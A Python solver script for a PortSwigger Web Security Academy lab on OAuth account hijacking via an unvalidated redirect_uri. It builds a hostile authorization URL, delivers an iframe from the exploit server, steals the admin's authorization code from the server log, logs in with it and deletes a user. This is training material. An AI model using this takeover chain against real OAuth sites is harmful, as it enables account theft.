#!/usr/bin/env python3
"""
OAuth account hijacking via redirect_uri
PortSwigger Web Security Academy -- OAuth authentication

Companion script for the writeup: 03-oauth-account-hijacking-via-redirect-uri.md

What this does:
    The OAuth provider accepts any redirect_uri without validating it against a
    whitelist. This script discovers the real authorization URL (client_id,
    response_type, scope) by starting the blog's own OAuth flow, then builds a new
    authorization URL with redirect_uri swapped to the lab's exploit server and
    wraps it in an iframe. Because the admin already holds an active OAuth provider
    session, delivering that iframe silently reissues a fresh authorization code
    straight to the exploit server -- no admin interaction needed beyond loading
    the page. The script pulls the leaked code from the exploit server's access
    log and replays it at the blog's real /oauth-callback to complete the takeover,
    then deletes carlos from the admin panel.

Usage:
    python 03-oauth-account-hijacking-via-redirect-uri.py <lab-url>
    e.g. python 03-oauth-account-hijacking-via-redirect-uri.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import time
import urllib.parse
import httpx


def solve(lab_url: str) -> None:
    c = httpx.Client(verify=False, follow_redirects=True, timeout=15)

    home = c.get(lab_url)
    exploit_m = re.search(r'(https://exploit-[^/]+\.exploit-server\.net)', home.text)
    if not exploit_m:
        print("[-] No exploit server found on the lab homepage.")
        return
    exploit_server = exploit_m.group(1)
    print(f"[*] Exploit server: {exploit_server}")

    # Step 1: discover the OAuth flow's real parameters.
    print("[*] Discovering OAuth flow...")
    c2 = httpx.Client(verify=False, follow_redirects=False, timeout=15)
    r = c2.get(f"{lab_url}/social-login", follow_redirects=False)

    location = r.headers.get("location", "")
    if not location.startswith("http"):
        location = f"{lab_url}{location}"

    parsed = urllib.parse.urlparse(location)
    params = urllib.parse.parse_qs(parsed.query)
    oauth_origin = f"{parsed.scheme}://{parsed.netloc}"
    auth_path = parsed.path

    client_id = params.get("client_id", [""])[0]
    original_redirect = params.get("redirect_uri", [""])[0]
    response_type = params.get("response_type", ["code"])[0]
    scope = params.get("scope", ["openid profile email"])[0]

    print(f"[*] OAuth provider: {oauth_origin}")
    print(f"[*] Client ID: {client_id}")
    print(f"[*] Original redirect_uri: {original_redirect}")
    c2.close()

    # Step 2: build an authorization URL that points redirect_uri at our own server.
    malicious_auth_url = (
        f"{oauth_origin}{auth_path}"
        f"?client_id={client_id}"
        f"&redirect_uri={urllib.parse.quote(exploit_server, safe='')}"
        f"&response_type={response_type}"
        f"&scope={urllib.parse.quote(scope)}"
    )

    # Step 3: deploy the iframe exploit.
    csrf_body = f'<iframe src="{malicious_auth_url}"></iframe>'
    print("[*] Deploying redirect_uri hijack exploit...")
    c.post(
        f"{exploit_server}/",
        data={
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html",
            "responseBody": csrf_body,
            "formAction": "STORE",
        },
    )

    c.get(f"{exploit_server}/deliver-to-victim")
    print("[*] Exploit delivered, waiting for admin to visit...")
    time.sleep(5)

    # Step 4: pull the leaked authorization code out of the access log.
    log = c.get(f"{exploit_server}/log").text
    codes = re.findall(r'[?&]code=([A-Za-z0-9_-]+)', log)
    if not codes:
        time.sleep(5)
        log = c.get(f"{exploit_server}/log").text
        codes = re.findall(r'[?&]code=([A-Za-z0-9_-]+)', log)

    if not codes:
        print("[-] No authorization code captured from admin.")
        return

    stolen_code = codes[-1]
    print(f"[+] Stolen admin code: {stolen_code}")

    # Step 5: replay the code at the blog's real callback.
    print("[*] Using stolen code to login as admin...")
    callback = original_redirect if original_redirect else f"{lab_url}/oauth-callback"
    c.get(f"{callback}?code={stolen_code}")

    # Step 6: delete carlos from the admin panel.
    admin_page = c.get(f"{lab_url}/admin")
    if "carlos" in admin_page.text:
        delete_url = re.search(r'href="(/admin/delete\?username=carlos)"', admin_page.text)
        if delete_url:
            c.get(f"{lab_url}{delete_url.group(1)}")
            print("[+] Deleted carlos.")

    check = c.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
